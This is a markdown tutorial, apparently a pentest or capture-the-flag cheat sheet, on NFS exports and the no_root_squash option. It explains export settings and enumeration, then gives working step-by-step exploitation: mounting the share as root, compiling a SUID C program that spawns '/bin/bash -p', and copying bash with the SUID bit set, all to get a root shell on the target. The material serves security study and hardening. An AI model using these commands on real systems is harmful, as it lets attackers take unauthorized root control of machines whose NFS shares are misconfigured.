# NFS no_root_squash

## Table of Contents

1. [Overview](#overview)
2. [How NFS Shares Work](#how-nfs-shares-work)
3. [no_root_squash Exploitation](#no_root_squash-exploitation)

---

## Overview

NFS (Network File System) allows a server to share directories over the network. Remote clients mount these directories as if they were local. It is commonly used in enterprise environments and CTFs.

The security risk comes from the `no_root_squash` option: by default, NFS "squashes" remote root requests to the `nobody` user (so remote root has no privilege on the share). When `no_root_squash` is set, remote root **keeps root privileges** on the shared files — meaning we can create SUID binaries on the share that will execute as root on the target.

## How NFS Shares Work

```
NFS Server (/etc/exports)
    → Exports directories to clients
        → Clients mount them locally
            → File access follows export options
```

The export configuration is in `/etc/exports`:

```bash
# Format: <directory> <client>(options)
/home/backup    *(rw,sync,no_root_squash)
/var/shared     192.168.1.0/24(rw,sync,root_squash)
```

Key options:

| Option | Meaning |
|---|---|
| `rw` | Read/write access |
| `ro` | Read-only access |
| `root_squash` | Remote root is mapped to `nobody` (default, safe) |
| `no_root_squash` | Remote root keeps root privileges (dangerous) |
| `no_all_squash` | Preserves remote user UIDs |

### Enumeration

```bash
# From the target — check exported shares
cat /etc/exports

# From your machine — list shares exposed by the target
showmount -e <target_ip>

# Check for no_root_squash
cat /etc/exports | grep no_root_squash
```

## no_root_squash Exploitation

If a share has `no_root_squash` and we can mount it, we can create a SUID root binary on the share that will be executed on the target.

### Steps

1. **Identify the vulnerable share** (from attacker machine):

```bash
showmount -e <target_ip>
# /home/backup *
```

2. **Mount the share as root on your machine:**

```bash
mkdir /tmp/nfs
mount -t nfs <target_ip>:/home/backup /tmp/nfs
```

3. **Create a SUID binary on the share:**

```c
// shell.c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

```bash
gcc shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell
ls -la /tmp/nfs/shell
# -rwsr-sr-x 1 root root ... /tmp/nfs/shell
```

4. **On the target, execute the SUID binary:**

```bash
/home/backup/shell
# root shell
```

### Alternative: copy bash directly

```bash
# On attacker machine (as root, on the mounted share)
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# On target
/home/backup/rootbash -p
```

> **Note:** The bash binary must be compatible with the target (same architecture, similar libc version). Using a small custom C binary is more reliable.
